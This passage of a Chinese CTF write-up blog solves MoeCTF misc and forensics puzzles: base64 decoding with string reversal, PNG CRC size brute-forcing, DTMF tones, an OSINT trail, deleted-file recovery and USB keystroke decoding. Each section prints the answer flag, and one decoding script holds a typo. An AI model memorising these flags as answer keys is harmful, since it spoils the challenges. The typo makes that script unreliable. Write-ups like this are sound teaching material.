class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>content<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">10</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># b'XRXl1V41m'</span></pre></td></tr></table></figure><p>发现 = 变到了前方，需要进行翻转字符串，&lt;font color='red'&gt; 如果此时继续编码则会报错 &lt;/font&gt;</p>\n<p>所以思路出来了：不断编码，报错就翻转再编码，直至出现 moe 为止</p>\n<p>脚本如下：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        data <span class=\"token operator\">=</span> base64<span class=\"token punctuation\">.</span>decodebytes<span class=\"token punctuation\">(</span>content<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        data<span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token string\">'utf-8'</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#注意要进行解码</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">except</span> Exception<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        data <span class=\"token operator\">=</span> base64<span class=\"token punctuation\">.</span>decodebytes<span class=\"token punctuation\">(</span>content<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        data<span class=\"token punctuation\">.</span><span class=\"token punctuation\">,</span>decode<span class=\"token punctuation\">(</span><span class=\"token string\">'utf-8'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token string\">b'moe'</span> <span class=\"token keyword\">in</span> data<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    content <span class=\"token operator\">=</span> data</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token comment\">#b'moectf&#123;fffffflipppppp&#125;'</span></pre></td></tr></table></figure><h3 id=\"\"><a class=\"anchor\" href=\"#\">#</a> </h3>\n<p><code>moectf&#123;fffffflipppppp&#125;</code></p>\n<h2 id=\"white-album\"><a class=\"anchor\" href=\"#white-album\">#</a> <strong>White Album</strong></h2>\n<p>参考博客：</p>\n<blockquote>\n<p><a href=\"\">https://www.notion.so/MoeCTF-readme-txt-487c4f5e93764867b7aeead6a263c4ba#b8c0d9633d0e4bfe89ccd0fdb0f2672f</a></p>\n</blockquote>\n<p>打开可以看到 <code>.png</code>  ，用 kali 打开图片，打不开（白屏），网上搜了一下，是图片宽高的问题，CRC 爆破出原宽高 (找到的脚本)</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> zlib</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> struct</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>filename <span class=\"token operator\">=</span> <span class=\"token string\">'test.png'</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span>filename<span class=\"token punctuation\">,</span> <span class=\"token string\">'rb'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    all_b <span class=\"token operator\">=</span> f<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    crc32key <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>all_b<span class=\"token punctuation\">[</span><span class=\"token number\">29</span><span class=\"token punctuation\">:</span><span class=\"token number\">33</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    data <span class=\"token operator\">=</span> <span class=\"token builtin\">bytearray</span><span class=\"token punctuation\">(</span>all_b<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">:</span><span class=\"token number\">29</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    n <span class=\"token operator\">=</span> <span class=\"token number\">4095</span>            <span class=\"token comment\">#理论上 0xffffffff, 但考虑到屏幕实际 /cpu，0x0fff 就差不多了</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">for</span> w <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>          <span class=\"token comment\">#高和宽一起爆破</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        width <span class=\"token operator\">=</span> <span class=\"token builtin\">bytearray</span><span class=\"token punctuation\">(</span>struct<span class=\"token punctuation\">.</span>pack<span class=\"token punctuation\">(</span><span class=\"token string\">'>i'</span><span class=\"token punctuation\">,</span> w<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>     <span class=\"token comment\">#q 为 8 字节，i 为 4 字节，h 为 2 字节</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token keyword\">for</span> h <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            height <span class=\"token operator\">=</span> <span class=\"token builtin\">bytearray</span><span class=\"token punctuation\">(</span>struct<span class=\"token punctuation\">.</span>pack<span class=\"token punctuation\">(</span><span class=\"token string\">'>i'</span><span class=\"token punctuation\">,</span> h<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>            <span class=\"token keyword\">for</span> x <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>                data<span class=\"token punctuation\">[</span>x<span class=\"token operator\">+</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> width<span class=\"token punctuation\">[</span>x<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>                data<span class=\"token punctuation\">[</span>x<span class=\"token operator\">+</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> height<span class=\"token punctuation\">[</span>x<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>            crc32result <span class=\"token operator\">=</span> zlib<span class=\"token punctuation\">.</span>crc32<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>            <span class=\"token keyword\">if</span> crc32result <span class=\"token operator\">==</span> crc32key<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>                <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"宽为：\"</span><span class=\"token punctuation\">,</span>end<span class=\"token operator\">=</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>                <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>width<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>                <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"高为：\"</span><span class=\"token punctuation\">,</span>end<span class=\"token operator\">=</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>                <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>height<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>                exit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>然后在 <code>010 Editor</code>  里改它的宽高部分，得到完整图片，出现条码拿到在线二维码网站解码 (后面得知是 <code>PDF417</code>   介于二维码和条形码的一种码)</p>\n<p><img data-src=\"https://i.loli.net/2021/09/24/dvfwjZUOKyClDWR.png\" alt=\"\" /></p>\n<blockquote>\n<p>推荐网站： <span class=\"exturl\" data-url=\"aHR0cHM6Ly9qaWVtYS53d2VpLmNuLw==\">https://jiema.wwei.cn</span></p>\n</blockquote>\n<p><code>moectf&#123;WhY_@r3_u_s0_5K1ll3D&#125;</code></p>\n<h2 id=\"phone-call\"><a class=\"anchor\" href=\"#phone-call\">#</a> <strong>Phone Call</strong></h2>\n<p>参考博客<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzE5NzgwNjgz\"> https://www.zhihu.com/question/19780683</span><br />\n 这种题一就很复杂，拿到 <code>audacity</code>  看到将近 21 个峰</p>\n<p><img data-src=\"https://i.loli.net/2021/09/24/8nzZTmi7hAcKkvM.png\" alt=\"\" /></p>\n<p>然后偶然发现一个网站，就起飞，嘿嘿嘿 (<em>咱没有手撕能力</em>)</p>\n<blockquote>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL2RpYWxhYmMuY29tL3NvdW5kL2RldGVjdC9pbmRleC5odG1s\">http://dialabc.com/sound/detect/index.html</span></p>\n</blockquote>\n<p>再根据 <code>audacity</code>  给的间隔设置间隔符号就 sucess 了</p>\n<p><img data-src=\"https://i.loli.net/2021/09/24/cSpaHYQn8R2DEgZ.png\" alt=\"\" /></p>\n<p><code>moectf&#123;114514-1919810-7738-9634&#125;</code></p>\n<h2 id=\"社工题\"><a class=\"anchor\" href=\"#社工题\">#</a> <strong>社工题</strong></h2>\n<p>Bing 或者 Google 搜索 <code>Noah的博客</code></p>\n<p>先找到这个：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ub2FodGllLmdpdGh1Yi5pby9hYm91dC8=\">About NoahBox | NoahBox (noahtie.github.io)</span>，点击签订契约转到第二个</p>\n<p>第二个：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9tYXN0ZXJub2FoLmxvZnRlci5jb20v\">诺亚城主 (lofter.com)</span>，点击上面的 i，到第三个</p>\n<p>第三个：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ub2FoYm94LmdpdGh1Yi5pby9ndWVzdGJvb2sv\">留言版 | Noah's TRPG Box (noahbox.github.io)</span> 留言簿中发现这个 &lt; img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDkvMjQvQ2tkN1JnUDk4NTJMcGJRLnBuZw==\">https://i.loli.net/2021/09/24/Ckd7RgP9852LpbQ.png</span>&quot; alt=&quot;&quot; style=&quot;zoom:50%;&quot; /&gt;</p>\n<p>在侧边栏找到 github 地址，进入发现被 hacked 的仓库有摩斯密码，解密即可</p>\n<p><code>moectf&#123;HAHAHAHAH_NOAH_IS_A_VEGETABLE_CHICKEN&#125;</code></p>\n<h2 id=\"好-康-的\"><a class=\"anchor\" href=\"#好-康-的\">#</a> <strong>好 康 的</strong></h2>\n<blockquote>\n<p>参考博客<a href=\"https://blog.csdn.net/weixin_50656679/article/details/108936650?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522163249925516780262529870%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=163249925516780262529870&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v2~rank_v29-24-108936650.pc_v2_rank_blog_default&amp;utm_term=mkv&amp;spm=1018.2226.3001.4450\"> https://blog.csdn.net/weixin_50656679/article/details/108936650?ops_request_misc=%7B%22request%5Fid%22%3A%22163249925516780262529870%22%2C%22scm%22%3A%2220140713.130102334.pc%5Fblog.%22%7D&amp;request_id=163249925516780262529870&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2<sub>blog</sub>first_rank_v2~rank_v29-24-108936650.pc_v2_rank_blog_default&amp;utm_term=mkv&amp;spm=1018.2226.300</a></p>\n</blockquote>\n<ol>\n<li>播放发现在 3 分钟左右之后就不能播放，感觉有问题，用  <code>mkvtoolnix</code>  分离出来字幕和视频，拖进 <code>010 Editor</code>  直接搜索  <code>moectf</code>  ，找到 flag</li>\n<li>用 potplayer 打开视频，然后将字幕另存为 1.ass，打开后发现最后一行为 flag</li>\n</ol>\n<p><img data-src=\"https://i.loli.net/2021/09/25/gB9Y4Z8IwPEqed7.png\" alt=\"\" /></p>\n<p><code>moectf&#123;N3v3r_90tt@_L3t-y0U_dOwN~&#125;</code></p>\n<h2 id=\"easyforensics\"><a class=\"anchor\" href=\"#easyforensics\">#</a> <strong>easyForensics</strong></h2>\n<p>用  <code>AccessData FTK Imager</code>  打开，游览找到  <code>flag.mp4</code>  ，非常惊喜，用各种办法尝试分析没得出任何信息 (虽然发现有一些很奇怪的文件)</p>\n<p>等到比赛结束的时候才知道不是这个文件 (<s>Noah 设陷阱哈</s>，比赛结束后在  <code>FTK</code>  里发现一些被删除的文件夹 (Base64 命名) 还有一个 python 文件，全部导出来，然后用 bat 导出文件名</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>DIR <span class=\"token operator\">*</span><span class=\"token punctuation\">.</span> <span class=\"token operator\">*</span> <span class=\"token operator\">/</span>B<span class=\"token operator\">></span> LIST<span class=\"token punctuation\">.</span>TXT</pre></td></tr></table></figure><p>看到 python 文件中有  <code>data = data.replace(&quot;/&quot;, &quot;_&quot;)</code>  我们再将 <code>_</code> 全部换成 <code>/</code></p>\n<p>再用 base64 解码 (我用 <code>CyberChef</code> ) 查看 16 进制结果，发现是个 word, 网上找脚本输出 word 得出 flag</p>\n<p><code>moectf&#123;Th@1s_N0t_U53FULL@_4LL&#125;</code></p>\n<h2 id=\"r-p-g\"><a class=\"anchor\" href=\"#r-p-g\">#</a> <strong>R P G</strong></h2>\n<p><s>这个我以为要修改数据通关数据，确实也是如此因为实在过不了关</s></p>\n<p>Noah 师傅传授的一种就是交换 <code>Data</code>   里的 <code>Map001.json</code>   <code>和Map002.json</code>  的文件名称，便可通过第一关拿到第一个字母，*<s> 往复循环</s> * 你就可以得到 base64 编码的一串字符串（<s>秃了也变强了</s>）</p>\n<p>其实打开 map002.json，仔细查看便可以看到一列有规律的 base64 字符串，提取出来，反复解码，便得到</p>\n<p><code>moectf&#123;Th3_w0rld_0f_G4m3&#125;</code></p>\n<h2 id=\"诺亚的日记\"><a class=\"anchor\" href=\"#诺亚的日记\">#</a> <strong>诺亚的日记</strong></h2>\n<blockquote>\n<p>参考博客<a href=\"https://blog.csdn.net/qq_43625917/article/details/107723635?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522163250153316780269830444%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=163250153316780269830444&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-2-107723635.pc_search_result_hbase_insert&amp;utm_term=tshark+usb&amp;spm=1018.2226.3001.4187\"> https://blog.csdn.net/qq_43625917/article/details/107723635?ops_request_misc=%7B%22request%5Fid%22%3A%22163250153316780269830444%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&amp;request_id=163250153316780269830444&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2<sub>all</sub>first_rank_ecpm_v1~rank_v31_ecpm-2-107723635.pc_search_result_hbase_insert&amp;utm_term=tshark+usb&amp;spm=1018.2226.3001.4187</a></p>\n</blockquote>\n<p>用 <code>101editor</code>  打开，发现了 <code>wireshark</code>  字样，正好之前用过，结果数据里面没有 <code>Leftover Capture Data</code>  ，就百度到上面的博客，在 kali 中执行以下命令，结果空白格，放到 ubuntu 里面分析，可以了 (实际<em> kali 的 tshark 的版本问题</em>)</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>tshark -r usb.pcap -T fields -e usb.capdata <span class=\"token operator\">></span> usbdata.txt</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>tshark -r usb.pcap -T fields -e usb.capdata <span class=\"token operator\">|</span> <span class=\"token function\">sed</span> <span class=\"token string\">'/^\\s*$/d'</span> <span class=\"token operator\">></span> usbdata.txt <span class=\"token comment\">#提取并去除空行</span></pre></td></tr></table></figure><p>便提取到了 usb 的流量数据，然后用映射关系，将所做操作提取出来</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>normalKeys <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token string\">\"04\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"a\"</span>, <span class=\"token string\">\"05\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"b\"</span>, <span class=\"token string\">\"06\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"c\"</span>, <span class=\"token string\">\"07\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"d\"</span>, <span class=\"token string\">\"08\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"e\"</span>,</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token string\">\"09\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"f\"</span>, <span class=\"token string\">\"0a\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"g\"</span>, <span class=\"token string\">\"0b\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"h\"</span>, <span class=\"token string\">\"0c\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"i\"</span>, <span class=\"token string\">\"0d\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"j\"</span>,</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>     <span class=\"token string\">\"0e\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"k\"</span>, <span class=\"token string\">\"0f\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"l\"</span>, <span class=\"token string\">\"10\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"m\"</span>, <span class=\"token string\">\"11\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"n\"</span>, <span class=\"token string\">\"12\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"o\"</span>,</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>      <span class=\"token string\">\"13\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"p\"</span>, <span class=\"token string\">\"14\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"q\"</span>, <span class=\"token string\">\"15\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"r\"</span>, <span class=\"token string\">\"16\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"s\"</span>, <span class=\"token string\">\"17\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"t\"</span>,</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>       <span class=\"token string\">\"18\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"u\"</span>, <span class=\"token string\">\"19\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"v\"</span>, <span class=\"token string\">\"1a\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"w\"</span>, <span class=\"token string\">\"1b\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"x\"</span>, <span class=\"token string\">\"1c\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"y\"</span>,</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token string\">\"1d\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"z\"</span>,<span class=\"token string\">\"1e\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"1\"</span>, <span class=\"token string\">\"1f\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"2\"</span>, <span class=\"token string\">\"20\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"3\"</span>, <span class=\"token string\">\"21\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"4\"</span>,</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>         <span class=\"token string\">\"22\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"5\"</span>, <span class=\"token string\">\"23\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"6\"</span>,<span class=\"token string\">\"24\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"7\"</span>,<span class=\"token string\">\"25\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"8\"</span>,<span class=\"token string\">\"26\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"9\"</span>,</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>         <span class=\"token string\">\"27\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"0\"</span>,<span class=\"token string\">\"28\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"&lt;RET>\"</span>,<span class=\"token string\">\"29\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"&lt;ESC>\"</span>,<span class=\"token string\">\"2a\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"&lt;DEL>\"</span>, <span class=\"token string\">\"2b\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"<span class=\"token entity\" title=\"\\t\">\\t</span>\"</span>,</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>         <span class=\"token string\">\"2c\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"&lt;SPACE>\"</span>,<span class=\"token string\">\"2d\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"-\"</span>,<span class=\"token string\">\"2e\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"=\"</span>,<span class=\"token string\">\"2f\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"[\"</span>,<span class=\"token string\">\"30\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"]\"</span>,<span class=\"token string\">\"31\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"<span class=\"token entity\" title=\"\\\\\">\\\\</span>\"</span>,</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>         <span class=\"token string\">\"32\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"&lt;NON>\"</span>,<span class=\"token string\">\"33\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\";\"</span>,<span class=\"token string\">\"34\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"'\"</span>,<span class=\"token string\">\"35\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"&lt;GA>\"</span>,<span class=\"token string\">\"36\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\",\"</span>,<span class=\"token string\">\"37\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\".\"</span>,</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>         <span class=\"token string\">\"38\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"/\"</span>,<span class=\"token string\">\"39\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"&lt;CAP>\"</span>,<span class=\"token string\">\"3a\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"&lt;F1>\"</span>,<span class=\"token string\">\"3b\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"&lt;F2>\"</span>, <span class=\"token string\">\"3c\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"&lt;F3>\"</span>,<span class=\"token string\">\"3d\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"&lt;F4>\"</span>,</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>         <span class=\"token string\">\"3e\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"&lt;F5>\"</span>,<span class=\"token string\">\"3f\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"&lt;F6>\"</span>,<span class=\"token string\">\"40\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"&lt;F7>\"</span>,<span class=\"token string\">\"41\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"&lt;F8>\"</span>,<span class=\"token string\">\"42\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"&lt;F9>\"</span>,<span class=\"token string\">\"43\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"&lt;F10>\"</span>,</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>         <span class=\"token string\">\"44\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"&lt;F11>\"</span>,<span class=\"token string\">\"45\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"&lt;F12>\"</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>shiftKeys <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token string\">\"04\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"A\"</span>, <span class=\"token string\">\"05\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"B\"</span>, <span class=\"token string\">\"06\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"C\"</span>, <span class=\"token string\">\"07\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"D\"</span>, <span class=\"token string\">\"08\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"E\"</span>,</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>     <span class=\"token string\">\"09\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"F\"</span>, <span class=\"token string\">\"0a\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"G\"</span>, <span class=\"token string\">\"0b\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"H\"</span>, <span class=\"token string\">\"0c\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"I\"</span>, <span class=\"token string\">\"0d\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"J\"</span>,</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>      <span class=\"token string\">\"0e\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"K\"</span>, <span class=\"token string\">\"0f\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"L\"</span>, <span class=\"token string\">\"10\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"M\"</span>, <span class=\"token string\">\"11\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"N\"</span>, <span class=\"token string\">\"12\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"O\"</span>,</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>       <span class=\"token string\">\"13\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"P\"</span>, <span class=\"token string\">\"14\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"Q\"</span>, <span class=\"token string\">\"15\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"R\"</span>, <span class=\"token string\">\"16\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"S\"</span>, <span class=\"token string\">\"17\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"T\"</span>,</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token string\">\"18\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"U\"</span>, <span class=\"token string\">\"19\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"V\"</span>, <span class=\"token string\">\"1a\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"W\"</span>, <span class=\"token string\">\"1b\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"X\"</span>, <span class=\"token string\">\"1c\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"Y\"</span>,</pre></td></tr><tr><td data-num=\"21\"></td><td><pre>         <span class=\"token string\">\"1d\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"Z\"</span>,<span class=\"token string\">\"1e\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"!\"</span>, <span class=\"token string\">\"1f\"</span><span 